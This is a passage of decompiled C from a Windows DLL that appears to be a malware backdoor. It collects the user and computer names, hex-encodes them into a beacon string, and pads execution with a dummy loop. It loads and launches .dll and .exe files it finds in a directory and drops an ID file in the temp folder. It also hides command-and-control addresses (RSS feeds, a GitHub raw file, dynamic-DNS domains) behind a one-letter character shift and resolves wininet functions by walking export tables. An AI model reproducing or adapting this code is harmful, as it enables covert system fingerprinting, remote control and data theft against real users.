    *(int32_t *)v136 = 0x61766441;
    *v127 = v136;
    g137 = v137;
    *(int32_t *)v129 = 0x32336970;
    *(int32_t *)(v112 + 1532) = 0x6c6c642e;
    *(char *)(v112 + 1536) = 0;
    *v128 = (int32_t)"GetUserNameW";
    int32_t * v138 = (int32_t *)(v112 - 32); // 0x10004717
    *v138 = v137;
    function_10007210((int32_t)&g161, (char *)&g161);
    *v128 = v123;
    *v138 = v112 + 1752;
    *v125 = 0;
    int32_t v139 = v112 + 1744;
    int32_t * v140 = (int32_t *)(v112 - 36);
    int32_t v141 = v112 + 1152;
    int32_t v142 = 0; // 0x10004760
    if (*v124 != 0) {
        int32_t v143 = 0; // 0x10003d20
        *v140 = (int32_t)*(int16_t *)(2 * v143 + v139);
        *(int32_t *)(v112 - 40) = (int32_t)"%04x";
        *(int32_t *)(v112 - 44) = 4 * v143 + v141;
        wsprintfA((char *)&g161, (char *)&g161);
        int32_t v144 = *v125 + 1; // 0x10004792
        *v125 = v144;
        v143 = v144;
        while (v144 < *v124) {
            // 0x10004770
            *v140 = (int32_t)*(int16_t *)(2 * v143 + v139);
            *(int32_t *)(v112 - 40) = (int32_t)"%04x";
            *(int32_t *)(v112 - 44) = 4 * v143 + v141;
            wsprintfA((char *)&g161, (char *)&g161);
            v144 = *v125 + 1;
            *v125 = v144;
            v143 = v144;
        }
        // 0x1000479d
        v142 = 4 * v144;
    }
    // 0x1000479d
    *v140 = v139;
    *(char *)(v142 + v141) = 0;
    int32_t v145; // 0x10003d20
    if (lstrlenW((int16_t *)&g161) < 1) {
        int32_t v146 = v112 - 40; // 0x100047c3
        *(int32_t *)v146 = (int32_t)"UNIC";
        v145 = v146;
    } else {
        int32_t v147 = v112 - 40; // 0x100047c0
        *(int32_t *)v147 = v112 + 1148;
        v145 = v147;
    }
    int32_t v148 = v145;
    *(int32_t *)(v148 - 4) = v148 + 2180;
    lstrcatA((char *)&g161, (char *)&g161);
    int32_t v149 = v148 + 16; // 0x100047d2
    *(int32_t *)v149 = 100;
    *(int32_t *)(v148 - 8) = v149;
    *(int32_t *)(v148 - 12) = v148 + 1972;
    GetComputerNameW((int16_t *)&g161, &g161);
    int32_t * v150 = (int32_t *)(v148 + 4); // 0x100047ef
    *v150 = 0;
    int32_t * v151 = (int32_t *)(v148 + 8); // 0x100047f3
    int32_t * v152; // 0x10003d20
    int32_t v153; // 0x10003d20
    int32_t * v154; // 0x10003d20
    int32_t * v155; // 0x10003d20
    int32_t v156; // 0x10003d20
    if (*v151 == 0) {
        // 0x100047c8
        v155 = (int32_t *)(v148 - 24);
        v154 = (int32_t *)(v148 - 20);
        v153 = v148 + 1172;
        v152 = (int32_t *)(v148 - 16);
        v156 = 0;
    } else {
        int32_t * v157 = (int32_t *)(v148 - 16);
        int32_t v158 = v148 + 1172;
        int32_t * v159 = (int32_t *)(v148 - 20);
        int32_t * v160 = (int32_t *)(v148 - 24);
        int32_t v161 = 0; // 0x10003d20
        *v157 = (int32_t)*(int16_t *)(v148 + 1964 + 2 * v161);
        *v159 = (int32_t)"%04x";
        *v160 = 4 * v161 + v158;
        _sprintf((char *)&g161, (char *)&g161);
        int32_t v162 = *v150 + 1; // 0x10004825
        *v150 = v162;
        v161 = v162;
        while (v162 < *v151) {
            // 0x10004800
            *v157 = (int32_t)*(int16_t *)(v148 + 1964 + 2 * v161);
            *v159 = (int32_t)"%04x";
            *v160 = 4 * v161 + v158;
            _sprintf((char *)&g161, (char *)&g161);
            v162 = *v150 + 1;
            *v150 = v162;
            v161 = v162;
        }
        // 0x10004830
        v155 = v160;
        v154 = v159;
        v153 = v158;
        v152 = v157;
        v156 = 4 * v162;
    }
    // 0x10004830
    *v152 = 99;
    *(char *)(v156 + v153) = 0;
    *v154 = 0;
    *v155 = v148 + 1661;
    _memset(&g161, (int32_t)&g161, (int32_t)&g161);
    int32_t v163 = v148 + 1660; // 0x1000484c
    *(int32_t *)v163 = 0x3d6326;
    *v152 = v163;
    *v154 = v148 + 2164;
    lstrcatA((char *)&g161, (char *)&g161);
    *v155 = v148 + 1956;
    int32_t v164; // 0x10003d20
    if (lstrlenW((int16_t *)&g161) < 1) {
        int32_t v165 = v148 - 28; // 0x10004881
        *(int32_t *)v165 = (int32_t)"UNIC";
        v164 = v165;
    } else {
        int32_t v166 = v148 - 28; // 0x1000487e
        *(int32_t *)v166 = v148 + 1160;
        v164 = v166;
    }
    int32_t v167 = v164;
    *(int32_t *)(v167 - 4) = v167 + 2180;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v167 - 8) = v167 + 1288;
    int32_t v168 = v167 - 12; // 0x1000489f
    *(int32_t *)v168 = v167 + 2172;
    lstrcatA((char *)&g161, (char *)&g161);
    function_100034f0();
    int32_t v169 = v168; // 0x100048ae
    while (true) {
        int32_t v170 = v169;
        int32_t v171 = GetTickCount(); // 0x100048b0
        int32_t * v172 = (int32_t *)(v170 - 4); // 0x100048b6
        *v172 = v171;
        _srand((int32_t)&g161);
        *v172 = v170 + 0xb860;
        *(int32_t *)(v170 - 8) = v170 + 0x6a40;
        lstrcpyA((char *)&g161, (char *)&g161);
        *(int32_t *)(v170 - 12) = (int32_t)&g10;
        *(int32_t *)(v170 - 16) = v170 + 0x6a38;
        lstrcatA((char *)&g161, (char *)&g161);
        int32_t v173 = v170 - 20; // 0x100048eb
        *(int32_t *)v173 = v170 + 2160;
        *(int32_t *)v170 = lstrlenA((char *)&g161);
        *v172 = 0;
        int32_t v174 = 0;
        int32_t v175 = v173;
        int32_t v176 = v175; // 0x10004902
        int32_t v177 = v176;
        function_100035d0();
        *(int32_t *)(v177 - 4) = *(int32_t *)(v177 + 16) + 48;
        int32_t * v178 = (int32_t *)(v177 - 8);
        *v178 = v177 + 1184;
        lstrcatA((char *)&g161, (char *)&g161);
        int32_t v179; // 0x10003d20
        if (*(int32_t *)(v177 + 8) == 3) {
            // 0x1000494d
            v179 = *(int32_t *)(v177 + 12) - v174;
        } else {
            // 0x10004938
            v179 = _rand() % (*(int32_t *)(v177 + 12) / 4) + 1;
        }
        // 0x10004953
        *(int32_t *)(v177 - 12) = v177 + 1176;
        int32_t * v180 = (int32_t *)(v177 - 16); // 0x10004962
        *v180 = v177 + 0x6a38;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v177 - 20) = (int32_t)&g12;
        *(int32_t *)(v177 - 24) = v177 + 0x6a30;
        lstrcatA((char *)&g161, (char *)&g161);
        int32_t * v181 = (int32_t *)(v177 - 28); // 0x1000497d
        *v181 = v179;
        int32_t v182 = v177 - 32; // 0x1000497e
        int32_t * v183 = (int32_t *)v182; // 0x1000497e
        *v183 = v174 + 2152 + v177;
        int32_t v184 = v177 + 0x1050; // 0x1000497f
        int32_t * v185 = (int32_t *)(v177 - 36);
        *v185 = v184;
        _strncpy((char *)&g161, (char *)&g161, (int32_t)&g161);
        if (v179 >= 1000) {
            // break (via goto) -> 0x10004a53
            goto lab_0x10004a53;
        }
        // 0x1000499b
        *(char *)(v179 + v184) = 0;
        *v181 = v184;
        *v183 = v177 + 0x6a28;
        lstrcatA((char *)&g161, (char *)&g161);
        int32_t v186 = *v180 + 1; // 0x100049bb
        *v180 = v186;
        int32_t v187 = v179 + v174; // 0x100049c3
        while (v186 < 4) {
            // 0x10004900
            v174 = v187;
            v175 = v182;
            v176 = v175;
            if (v186 != 0) {
                // 0x10004904
                *(int32_t *)(v175 - 4) = (int32_t)&g11;
                v176 = v175 - 8;
                *(int32_t *)v176 = v175 + 0x6a40;
                lstrcatA((char *)&g161, (char *)&g161);
            }
            // 0x10004913
            v177 = v176;
            function_100035d0();
            *(int32_t *)(v177 - 4) = *(int32_t *)(v177 + 16) + 48;
            v178 = (int32_t *)(v177 - 8);
            *v178 = v177 + 1184;
            lstrcatA((char *)&g161, (char *)&g161);
            if (*(int32_t *)(v177 + 8) == 3) {
                // 0x1000494d
                v179 = *(int32_t *)(v177 + 12) - v174;
            } else {
                // 0x10004938
                v179 = _rand() % (*(int32_t *)(v177 + 12) / 4) + 1;
            }
            // 0x10004953
            *(int32_t *)(v177 - 12) = v177 + 1176;
            v180 = (int32_t *)(v177 - 16);
            *v180 = v177 + 0x6a38;
            lstrcatA((char *)&g161, (char *)&g161);
            *(int32_t *)(v177 - 20) = (int32_t)&g12;
            *(int32_t *)(v177 - 24) = v177 + 0x6a30;
            lstrcatA((char *)&g161, (char *)&g161);
            v181 = (int32_t *)(v177 - 28);
            *v181 = v179;
            v182 = v177 - 32;
            v183 = (int32_t *)v182;
            *v183 = v174 + 2152 + v177;
            v184 = v177 + 0x1050;
            v185 = (int32_t *)(v177 - 36);
            *v185 = v184;
            _strncpy((char *)&g161, (char *)&g161, (int32_t)&g161);
            if (v179 >= 1000) {
                // break (via goto) -> 0x10004a53
                goto lab_0x10004a53;
            }
            // 0x1000499b
            *(char *)(v179 + v184) = 0;
            *v181 = v184;
            *v183 = v177 + 0x6a28;
            lstrcatA((char *)&g161, (char *)&g161);
            v186 = *v180 + 1;
            *v180 = v186;
            v187 = v179 + v174;
        }
        // 0x100049c9
        *v178 = 2;
        int32_t * v188 = (int32_t *)(v177 - 40);
        int32_t v189 = 3;
        int32_t v190 = 2; // 0x100049fe
        int32_t v191 = v189 - 1; // 0x100049e5
        int32_t v192 = 2; // 0x100049ea
        int32_t v193 = 2; // 0x100049ea
        int32_t v194; // 0x10003d20
        int64_t v195; // 0x100049f3
        int32_t v196; // 0x100049f9
        if (v191 >= 2) {
            // 0x100049f0
            v195 = 0x100000000 * (int64_t)(v189 >> 31) | (int64_t)v189;
            v194 = 2;
            v192 = v190;
            v193 = v194;
            while ((int32_t)(v195 % (int64_t)v194) != 0) {
                // 0x100049f9
                v196 = v194 + 1;
                v192 = v190;
                v193 = v196;
                if (v196 > v191) {
                    // break -> 0x10004a02
                    break;
                }
                v194 = v196;
                v192 = v190;
                v193 = v194;
            }
        }
        int32_t v197 = v192; // 0x10004a04
        if (v193 == v189) {
            // 0x10004a06
            *v185 = v189;
            *v188 = (int32_t)"%d\n";
            _printf((char *)&g161);
            v197 = *v178 + 1;
            *v178 = v197;
        }
        int32_t v198 = v197;
        int32_t v199 = v189 + 1; // 0x10004a23
        while (v198 < 1001) {
            // 0x100049e0
            v189 = v199;
            v190 = v197;
            v191 = v189 - 1;
            v192 = v198;
            v193 = 2;
            if (v191 >= 2) {
                // 0x100049f0
                v195 = 0x100000000 * (int64_t)(v189 >> 31) | (int64_t)v189;
                v194 = 2;
                v192 = v190;
                v193 = v194;
                while ((int32_t)(v195 % (int64_t)v194) != 0) {
                    // 0x100049f9
                    v196 = v194 + 1;
                    v192 = v190;
                    v193 = v196;
                    if (v196 > v191) {
                        // break -> 0x10004a02
                        break;
                    }
                    v194 = v196;
                    v192 = v190;
                    v193 = v194;
                }
            }
            // 0x10004a02
            v197 = v192;
            if (v193 == v189) {
                // 0x10004a06
                *v185 = v189;
                *v188 = (int32_t)"%d\n";
                _printf((char *)&g161);
                v197 = *v178 + 1;
                *v178 = v197;
            }
            // 0x10004a1d
            v198 = v197;
            v199 = v189 + 1;
        }
        // 0x10004a25
        *v185 = *(int32_t *)(v177 + 4);
        *(int32_t *)(v177 - 56) = *(int32_t *)v177;
        *(int32_t *)(v177 - 60) = v177 + 1392;
        function_10008d20((int32_t)&g161, (int32_t)&g161);
        v169 = v182;
    }
  lab_0x10004a53:
    // 0x10004a53
    function_1000b43d();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x10004a60 - 0x10004d80
int32_t function_10004a60(int32_t a1) {
    // 0x10004a60
    int32_t v1; // bp-4, 0x10004a60
    int32_t v2 = &v1; // 0x10004a61
    int128_t v3; // 0x10004a60
    int128_t v4 = __asm_xorps(v3, v3); // 0x10004a7f
    int128_t v5; // 0x10004a60
    __asm_movdqu(v5, v4);
    int128_t v6; // 0x10004a60
    __asm_movdqu(v6, v4);
    int128_t v7; // 0x10004a60
    __asm_movdqu(v7, v4);
    int128_t v8 = 68; // bp-1956, 0x10004abb
    int128_t v9; // 0x10004a60
    __asm_movdqu(v9, v4);
    int32_t v10 = 0x6d005c; // bp-156, 0x10004acd
    int128_t v11; // 0x10004a60
    __asm_movdqu(v11, v4);
    GetEnvironmentVariableW((int16_t *)0x6c006d, (int16_t *)110, (int32_t)&g161);
    int32_t lpString; // bp-1244, 0x10004a60
    int32_t v12 = 2 * lstrlenW((int16_t *)&lpString); // 0x10004b0d
    int32_t v13 = v2 - 1240; // 0x10004b0d
    *(int16_t *)(v12 + v13) = 92;
    uint32_t v14 = v12 + 2; // 0x10004b15
    if (v14 < 1024) {
        // 0x10004b27
        *(int16_t *)(v14 + v13) = 0;
        lstrcatW((int16_t *)&lpString, (int16_t *)&g132);
        int32_t v15 = 2 * lstrlenW((int16_t *)&lpString); // 0x10004b4c
        *(int32_t *)(v15 + v13) = 0x2a005c;
        uint32_t v16 = v15 + 4; // 0x10004b57
        if (v16 < 1024) {
            // 0x10004b69
            *(int16_t *)(v16 + v13) = 0;
            char lpFindFileData; // bp-1836, 0x10004a60
            int32_t * hFindFile = FindFirstFileW((int16_t *)&lpString, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x10004b81
            int32_t v17 = (int32_t)hFindFile; // 0x10004b81
            int32_t v18 = lstrlenW((int16_t *)&lpString); // 0x10004b96
            int32_t v19 = v17; // bp-2020, 0x10004ba5
            if (!FindNextFileW(hFindFile, (struct _WIN32_FIND_DATAW *)&lpFindFileData)) {
                // 0x10004d60
                return _40___security_check_cookie_40_4();
            }
            // 0x10004bc0
            int32_t v20; // bp-1792, 0x10004a60
            int32_t v21 = &v20; // 0x10004bcd
            int16_t * v22; // bp-48, 0x10004a60
            int32_t v23 = (int32_t)&v22;
            int32_t v24 = v2 - 1242 + 2 * v18;
            int32_t v25 = &lpString;
            int32_t * v26 = (int32_t *)a1;
            int32_t v27 = &v19;
            *(int32_t *)(v27 - 4) = (int32_t)&v10;
            *(int32_t *)(v27 - 8) = v21;
            int16_t * v28 = StrStrIW((int16_t *)&g161, (int16_t *)&g161); // 0x10004bce
            *(int32_t *)(v27 - 12) = v23;
            v22 = (int16_t *)0x64002e;
            *(int32_t *)(v27 - 16) = v21;
            int16_t * v29 = StrStrIW(v28, (int16_t *)&g161); // 0x10004bf5
            v22 = (int16_t *)0x78002e;
            *(int32_t *)(v27 - 20) = v23;
            int32_t v30 = v27 - 24; // 0x10004c18
            *(int32_t *)v30 = v21;
            int16_t * lpString1 = StrStrIW(v22, (int16_t *)0x780065); // 0x10004c19
            int32_t v31 = v30; // 0x10004c2d
            int32_t v32; // bp-1860, 0x10004a60
            int32_t v33; // bp-216, 0x10004a60
            int32_t v34; // 0x10004a60
            int32_t v35; // 0x10004a60
            char v36; // 0x10004a60
            int32_t * v37; // 0x10004c78
            int32_t v38; // 0x10004c78
            char v39; // 0x10004a60
            int32_t v40; // 0x10004c99
            int32_t v41; // 0x10004ce5
            if (v28 != NULL && v29 != NULL) {
                // 0x10004c3b
                v31 = v30;
                if ((lpFindFileData & 16) == 0) {
                    // 0x10004c48
                    *(int32_t *)(v27 - 28) = v21;
                    *(int32_t *)(v27 - 32) = v24;
                    lstrcpyW(lpString1, (int16_t *)&g161);
                    *(int32_t *)(v27 - 36) = 0;
                    *(int32_t *)(v27 - 40) = 128;
                    *(int32_t *)(v27 - 44) = 3;
                    *(int32_t *)(v27 - 48) = 0;
                    *(int32_t *)(v27 - 52) = 1;
                    *(int32_t *)(v27 - 56) = -0x80000000;
                    *(int32_t *)(v27 - 60) = v25;
                    v37 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161);
                    v38 = (int32_t)v37;
                    *(int32_t *)(v27 - 64) = 0;
                    *(int32_t *)(v27 - 68) = (int32_t)&v32;
                    *(int32_t *)(v27 - 72) = 60;
                    *(int32_t *)(v27 - 76) = (int32_t)&v33;
                    *(int32_t *)(v27 - 80) = v38;
                    ReadFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
                    v40 = v27 - 84;
                    *(int32_t *)v40 = v38;
                    CloseHandle(&g161);
                    v31 = v40;
                    if (v39 != 0 == v32 == 60) {
                        // 0x10004cbd
                        *(int32_t *)(4 * *v26 + v35) = (int32_t)v39;
                        *(int32_t *)(4 * *v26 + v34) = (int32_t)v36;
                        *v26 = *v26 + 1;
                        v41 = v27 - 88;
                        *(int32_t *)v41 = v25;
                        LoadLibraryW((int16_t *)&g161);
                        v31 = v41;
                    }
                }
            }
            int32_t v42 = v31;
            int32_t v43 = v42; // 0x10004cf9
            int128_t v44; // bp-1880, 0x10004a60
            if (v28 != NULL && lpString1 != NULL) {
                // 0x10004cff
                *(int32_t *)(v42 - 4) = v21;
                *(int32_t *)(v42 - 8) = v24;
                lstrcpyW((int16_t *)&g161, (int16_t *)&g161);
                *(int32_t *)(v42 - 12) = (int32_t)&v44;
                *(int32_t *)(v42 - 16) = (int32_t)&v8;
                *(int32_t *)(v42 - 20) = 0;
                *(int32_t *)(v42 - 24) = 0;
                *(int32_t *)(v42 - 28) = 0;
                *(int32_t *)(v42 - 32) = 0;
                *(int32_t *)(v42 - 36) = 0;
                *(int32_t *)(v42 - 40) = 0;
                *(int32_t *)(v42 - 44) = 0;
                v43 = v42 - 48;
                *(int32_t *)v43 = v25;
                CreateProcessW((int16_t *)&g161, (int16_t *)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (bool)&g161, (int32_t)&g161, &g161, (int16_t *)&g161, (struct _STARTUPINFOW *)&g161, (struct _PROCESS_INFORMATION *)&g161);
            }
            // 0x10004d3f
            *(int32_t *)(v43 - 4) = (int32_t)&lpFindFileData;
            int32_t v45 = v43 - 8; // 0x10004d46
            *(int32_t *)v45 = v17;
            while (FindNextFileW(&g161, (struct _WIN32_FIND_DATAW *)&g161)) {
                // 0x10004bc0
                v27 = v45;
                *(int32_t *)(v27 - 4) = (int32_t)&v10;
                *(int32_t *)(v27 - 8) = v21;
                v28 = StrStrIW((int16_t *)&g161, (int16_t *)&g161);
                *(int32_t *)(v27 - 12) = v23;
                v22 = (int16_t *)0x64002e;
                *(int32_t *)(v27 - 16) = v21;
                v29 = StrStrIW(v28, (int16_t *)&g161);
                v22 = (int16_t *)0x78002e;
                *(int32_t *)(v27 - 20) = v23;
                v30 = v27 - 24;
                *(int32_t *)v30 = v21;
                lpString1 = StrStrIW(v22, (int16_t *)0x780065);
                v31 = v30;
                if (v28 != NULL && v29 != NULL) {
                    // 0x10004c3b
                    v31 = v30;
                    if ((lpFindFileData & 16) == 0) {
                        // 0x10004c48
                        *(int32_t *)(v27 - 28) = v21;
                        *(int32_t *)(v27 - 32) = v24;
                        lstrcpyW(lpString1, (int16_t *)&g161);
                        *(int32_t *)(v27 - 36) = 0;
                        *(int32_t *)(v27 - 40) = 128;
                        *(int32_t *)(v27 - 44) = 3;
                        *(int32_t *)(v27 - 48) = 0;
                        *(int32_t *)(v27 - 52) = 1;
                        *(int32_t *)(v27 - 56) = -0x80000000;
                        *(int32_t *)(v27 - 60) = v25;
                        v37 = CreateFileW((int16_t *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161);
                        v38 = (int32_t)v37;
                        *(int32_t *)(v27 - 64) = 0;
                        *(int32_t *)(v27 - 68) = (int32_t)&v32;
                        *(int32_t *)(v27 - 72) = 60;
                        *(int32_t *)(v27 - 76) = (int32_t)&v33;
                        *(int32_t *)(v27 - 80) = v38;
                        ReadFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
                        v40 = v27 - 84;
                        *(int32_t *)v40 = v38;
                        CloseHandle(&g161);
                        v31 = v40;
                        if (v39 != 0 == v32 == 60) {
                            // 0x10004cbd
                            *(int32_t *)(4 * *v26 + v35) = (int32_t)v39;
                            *(int32_t *)(4 * *v26 + v34) = (int32_t)v36;
                            *v26 = *v26 + 1;
                            v41 = v27 - 88;
                            *(int32_t *)v41 = v25;
                            LoadLibraryW((int16_t *)&g161);
                            v31 = v41;
                        }
                    }
                }
                // 0x10004cf2
                v42 = v31;
                v43 = v42;
                if (v28 != NULL && lpString1 != NULL) {
                    // 0x10004cff
                    *(int32_t *)(v42 - 4) = v21;
                    *(int32_t *)(v42 - 8) = v24;
                    lstrcpyW((int16_t *)&g161, (int16_t *)&g161);
                    *(int32_t *)(v42 - 12) = (int32_t)&v44;
                    *(int32_t *)(v42 - 16) = (int32_t)&v8;
                    *(int32_t *)(v42 - 20) = 0;
                    *(int32_t *)(v42 - 24) = 0;
                    *(int32_t *)(v42 - 28) = 0;
                    *(int32_t *)(v42 - 32) = 0;
                    *(int32_t *)(v42 - 36) = 0;
                    *(int32_t *)(v42 - 40) = 0;
                    *(int32_t *)(v42 - 44) = 0;
                    v43 = v42 - 48;
                    *(int32_t *)v43 = v25;
                    CreateProcessW((int16_t *)&g161, (int16_t *)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (bool)&g161, (int32_t)&g161, &g161, (int16_t *)&g161, (struct _STARTUPINFOW *)&g161, (struct _PROCESS_INFORMATION *)&g161);
                }
                // 0x10004d3f
                *(int32_t *)(v43 - 4) = (int32_t)&lpFindFileData;
                v45 = v43 - 8;
                *(int32_t *)v45 = v17;
            }
            // 0x10004d60
            return _40___security_check_cookie_40_4();
        }
    }
    // 0x10004d71
    function_1000b43d();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    return __asm_int3();
}

// Address range: 0x10004d80 - 0x10004ec5
int32_t function_10004d80(void) {
    // 0x10004d80
    int32_t lpBuffer; // bp-1108, 0x10004d80
    GetTempPathW(500, (int16_t *)&lpBuffer);
    __asm_movdqu(0, __asm_movdqa_9(0x7400610064002e003900380054));
    lstrcatW((int16_t *)&g161, (int16_t *)&g161);
    int32_t * hFile = CreateFileW((int16_t *)&lpBuffer, -0x80000000, 7, NULL, 3, 128, NULL); // 0x10004de7
    int32_t lpNumberOfBytesRead = 200; // bp-1112, 0x10004deb
    int32_t lpBuffer2; // 0x10004d80
    if (hFile != (int32_t *)-1) {
        // 0x10004e90
        ReadFile(hFile, &((struct _SECURITY_ATTRIBUTES *)lpBuffer2)->e0, 100, &lpNumberOfBytesRead, NULL);
        *(char *)(lpNumberOfBytesRead + lpBuffer2) = 0;
        // 0x10004eae
        CloseHandle(&g161);
        return _40___security_check_cookie_40_4();
    }
    int32_t v1 = GetTickCount(); // 0x10004dfe
    int32_t v2 = 0; // 0x10004e0a
    int32_t v3 = 0; // 0x10004e0a
    if (v1 != 0) {
        uint32_t v4 = v1;
        int32_t v5 = v4 & 15; // 0x10004e17
        int32_t v6 = (v4 & 14) < 10 ? v5 | 48 : v5 + 55;
        *(char *)(v2 + lpBuffer2) = (char)v6;
        v2++;
        int32_t v7 = v4 / 16; // 0x10004e2d
        v3 = v2;
        while (v4 >= 16) {
            // 0x10004e10
            v4 = v7;
            v5 = v4 & 15;
            v6 = (v4 & 14) < 10 ? v5 | 48 : v5 + 55;
            *(char *)(v2 + lpBuffer2) = (char)v6;
            v2++;
            v7 = v4 / 16;
            v3 = v2;
        }
    }
    int32_t * hFile2 = CreateFileW((int16_t *)&lpBuffer, 0x40000000, 7, NULL, 2, 128, NULL); // 0x10004e48
    int32_t v8 = GetTickCount(); // 0x10004e4c
    int32_t v9 = v3; // 0x10004e56
    int32_t nNumberOfBytesToWrite = v3; // 0x10004e56
    if (v8 != 0) {
        uint32_t v10 = v8;
        int32_t v11 = v10 & 15; // 0x10004e5f
        int32_t v12 = (v10 & 14) < 10 ? v11 | 48 : v11 + 55;
        *(char *)(v9 + lpBuffer2) = (char)v12;
        v9++;
        int32_t v13 = v10 / 16; // 0x10004e75
        nNumberOfBytesToWrite = v9;
        while (v10 >= 16) {
            // 0x10004e58
            v10 = v13;
            v11 = v10 & 15;
            v12 = (v10 & 14) < 10 ? v11 | 48 : v11 + 55;
            *(char *)(v9 + lpBuffer2) = (char)v12;
            v9++;
            v13 = v10 / 16;
            nNumberOfBytesToWrite = v9;
        }
    }
    // 0x10004e77
    *(char *)(nNumberOfBytesToWrite + lpBuffer2) = 0;
    WriteFile(hFile2, (int32_t *)lpBuffer2, nNumberOfBytesToWrite, &lpNumberOfBytesRead, NULL);
    // 0x10004eae
    CloseHandle(&g161);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10004ed0 - 0x100058e7
int32_t function_10004ed0(int32_t a1, int32_t a2) {
    int32_t v1 = 0; // bp-1424, 0x10004f16
    int32_t lpString1; // bp-1388, 0x10004ed0
    lstrcpyA((char *)&lpString1, "iuuq;00xxx/xfcstt/dpn0dsfbufgffe/qiq@gffeje>59882");
    int32_t lpString1_; // bp-1308, 0x10004ed0
    lstrcpyA((char *)&lpString1_, "iuuq;00gffe54/dpn01347125927512764/ynm");
    int32_t lpString1__; // bp-1068, 0x10004ed0
    lstrcpyA((char *)&lpString1__, "iuuqt;00sbx/hjuivcvtfsdpoufou/dpn0Wmejs0sfbenf0nbtufs0ynm/ynm");
    lstrcpyA((char *)&lpString1__, "iuuqt;00nv{jl8:/xpseqsftt/dpn031270210210nv{jl.tiblft.z1v0");
    int32_t lpString1___; // bp-668, 0x10004ed0
    lstrcpyA((char *)&lpString1___, "bc1c{/dijdlfoljmmfs/dpn");
    int32_t lpString1____; // bp-588, 0x10004ed0
    lstrcpyA((char *)&lpString1____, "bc1c1{/dsbcebodf/dpn");
    int32_t lpString1_____; // bp-508, 0x10004ed0
    lstrcpyA((char *)&lpString1_____, "bc1c{2/kvnqjohdsbc/dpn");
    int128_t v2 = __asm_movdqa_9(0x6d6d6a7b704e3b756f66684273667456); // 0x10004f76
    int128_t v3 = __asm_movdqa_9(g31); // 0x10004f84
    int128_t v4; // 0x10004ed0
    __asm_movdqu(v4, v2);
    __asm_movdqu(0, __asm_movdqa_9(g50));
    int128_t v5; // 0x10004ed0
    __asm_movdqu(v5, __asm_movdqa_9(g60));
    int128_t v6; // 0x10004ed0
    __asm_movdqu(v6, __asm_movdqa_9(g49));
    int128_t v7; // 0x10004ed0
    __asm_movdqu(v7, __asm_movdqa_9(g63));
    int128_t v8; // 0x10004ed0
    __asm_movdqu(v8, __asm_movdqa_9(g39));
    int128_t v9; // bp-228, 0x10004ed0
    int32_t v10 = &v9; // 0x1000500b
    int32_t v11 = 3; // 0x1000500b
    int128_t * v12 = (int128_t *)(v10 - 16); // 0x10005016
    __asm_movdqu(*v12, __asm_psubb(__asm_movdqu_11(*v12), v3));
    int128_t * v13 = (int128_t *)v10; // 0x10005024
    __asm_movdqu(*v13, __asm_psubb(__asm_movdqu_11(*v13), v3));
    v11--;
    v10 += 32;
    while (v11 != 0) {
        // 0x10005013
        v12 = (int128_t *)(v10 - 16);
        __asm_movdqu(*v12, __asm_psubb(__asm_movdqu_11(*v12), v3));
        v13 = (int128_t *)v10;
        __asm_movdqu(*v13, __asm_psubb(__asm_movdqu_11(*v13), v3));
        v11--;
        v10 += 32;
    }
    // 0x10005035
    int32_t v14; // bp-4, 0x10004ed0
    int32_t v15 = &v14; // 0x10004ed1
    for (int32_t i = 96; i < 109; i++) {
        char * v16 = (char *)(v15 - 240 + i); // 0x10005035
        *v16 = *v16 - 1;
    }
    int128_t v17 = __asm_movdqa_9(0x202020206c6c642e74656e696e6977); // 0x10005042
    int128_t v18; // bp-116, 0x10004ed0
    int32_t v19 = &v18; // 0x1000504d
    int32_t v20 = v19; // bp-1544, 0x1000504d
    __asm_movdqu(0, v17);
    v18 = 0x65746e49;
    g76 = 0x32ce8ef;
    int32_t v21; // 0x10004ed0
    int32_t * v22 = (int32_t *)(v21 + 120 + v19); // 0x10005083
    int32_t v23 = *v22 + v19; // 0x1000508a
    int32_t v24 = function_10007210(v19, (char *)&v18); // 0x10005096
    int128_t v25 = __asm_movdqa_9(g57); // 0x1000509e
    uint16_t v26 = *(int16_t *)(2 * v24 + v19 + *(int32_t *)(v23 + 36)); // 0x100050a9
    int32_t v27 = *(int32_t *)(*(int32_t *)(v23 + 28) + v19 + 4 * (int32_t)v26); // 0x100050b3
    __asm_movdqu(0, v25);
    g117 = v27 + v19;
    int32_t v28 = *v22 + v19; // 0x100050e0
    int32_t v29 = function_10007210(v19, (char *)&v18); // 0x100050ec
    int128_t v30 = __asm_movdqa_9(g43); // 0x100050f4
    uint16_t v31 = *(int16_t *)(2 * v29 + v19 + *(int32_t *)(v28 + 36)); // 0x100050ff
    int32_t v32 = *(int32_t *)(*(int32_t *)(v28 + 28) + v19 + 4 * (int32_t)v31); // 0x10005109
    __asm_movdqu(0, v30);
    g127 = v32 + v19;
    int32_t v33 = *v22 + v19; // 0x10005126
    int32_t v34 = function_10007210(v19, (char *)&v18); // 0x10005132
    int128_t v35 = __asm_movdqa_9(g44); // 0x1000513a
    uint16_t v36 = *(int16_t *)(2 * v34 + v19 + *(int32_t *)(v33 + 36)); // 0x10005145
    int32_t v37 = *(int32_t *)(*(int32_t *)(v33 + 28) + v19 + 4 * (int32_t)v36); // 0x1000514f
    __asm_movdqu(0, v35);
    g142 = v37 + v19;
    int32_t v38 = *v22 + v19; // 0x10005169
    int32_t v39 = function_10007210(v19, (char *)&v18); // 0x10005178
    int128_t v40 = __asm_movdqa_9(0x6e614865736f6c4374656e7265746e49); // 0x10005183
